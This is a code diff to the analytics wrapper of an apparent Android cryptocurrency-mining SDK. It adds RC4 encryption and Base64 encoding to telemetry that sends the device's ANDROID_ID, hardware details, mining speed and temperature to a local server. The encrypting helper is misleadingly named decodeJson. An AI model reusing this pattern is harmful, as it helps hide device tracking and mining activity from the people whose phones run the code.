@@ -20,12 +20,16 @@ import java.util.List;
 import java.util.Map;
 
 import waterhole.miner.core.BuildConfig;
+import waterhole.miner.core.config.NightConfiguration;
+import waterhole.miner.core.utils.Base64Util;
 import waterhole.miner.core.utils.HttpRequest;
+import waterhole.miner.core.utils.LogUtils;
+import waterhole.miner.core.utils.RC4;
 
+import static android.provider.Settings.System.ANDROID_ID;
 import static waterhole.miner.core.asyn.AsyncTaskAssistant.executeOnThreadPool;
 import static waterhole.miner.core.utils.LogUtils.error;
 import static waterhole.miner.core.utils.LogUtils.info;
-import static android.provider.Settings.System.ANDROID_ID;
 
 /**
  * 统计包装类.
@@ -34,7 +38,7 @@ import static android.provider.Settings.System.ANDROID_ID;
  */
 public final class AnalyticsWrapper {
 
-    private static final String BASE_API = "http://192.168.1.185:8080/";
+    private static final String BASE_API = "http://192.168.1.4:8080/";
     private static final String SAVE_BASE_INFO_API = BASE_API + "save_base_info";
     private static final String INIT_API = BASE_API + "init";
     private static final String STORE_ERROR = BASE_API + "store_err";
@@ -66,8 +70,7 @@ public final class AnalyticsWrapper {
                         map.put("android_id", device.androidId);
                         map.put("abi", device.abi);
                         map.put("cpu_core_threads", device.cpuCoreThreads);
-                        // todo kzw 数据做加密处理
-                        String response = HttpRequest.post(SAVE_BASE_INFO_API).send(fromMapToJson(map)).body();
+                        String response = HttpRequest.post(SAVE_BASE_INFO_API).send(decodeJson(fromMapToJson(map))).body();
                         info("onDeviceEvent response = " + response);
                         int deviceId = optJsonIntAttr(response, "device_id");
                         if (deviceId != DEF_VALUE) {
@@ -82,6 +85,12 @@ public final class AnalyticsWrapper {
         } else {
             onInitEvent(application, getDeviceID(application));
         }
+    }
+
+    private static String decodeJson(String json) {
+        String result="{\"data\":\"" + Base64Util.encode(RC4.encry_RC4_byte(json, NightConfiguration.key)) + "\"}";
+        LogUtils.error(result);
+        return result;
     }
 
     private static void onInitEvent(final Application application, final int deviceId) {
@@ -104,8 +113,7 @@ public final class AnalyticsWrapper {
                         map.put("app_name", init.appName);
                         map.put("app_version", init.appVersion);
                         map.put("start_time", init.startTime);
-                        // todo kzw 数据做加密处理
-                        String response = HttpRequest.post(INIT_API).send(fromMapToJson(map)).body();
+                        String response = HttpRequest.post(INIT_API).send(decodeJson(fromMapToJson(map))).body();
                         info("onInitEvent response = " + response);
                         int mineId = optJsonIntAttr(response, "mine_id");
                         if (mineId != DEF_VALUE) {
@@ -143,8 +151,7 @@ public final class AnalyticsWrapper {
                     map.put("speed", mining.speed);
                     map.put("temperature", mining.temperature);
                     map.put("mining_time", mining.miningTime);
-                    // todo kzw 数据做加密处理
-                    int code = HttpRequest.post(MINING).send(fromMapToJson(map)).code();
+                    int code = HttpRequest.post(MINING).send(decodeJson(fromMapToJson(map))).code();
                     info("onMiningEvent code = " + code);
                 } catch (Exception e) {
                     error(e.getMessage());
@@ -166,8 +173,7 @@ public final class AnalyticsWrapper {
                     Map<String, Object> map = new HashMap<>();
                     map.put("device_id", deviceId);
                     map.put("error", error);
-                    // todo kzw 数据做加密处理
-                    int code = HttpRequest.post(STORE_ERROR).send(fromMapToJson(map)).code();
+                    int code = HttpRequest.post(STORE_ERROR).send(decodeJson(fromMapToJson(map))).code();
                     info("onError code = " + code);
                 } catch (Exception e) {
                     error(e.getMessage());
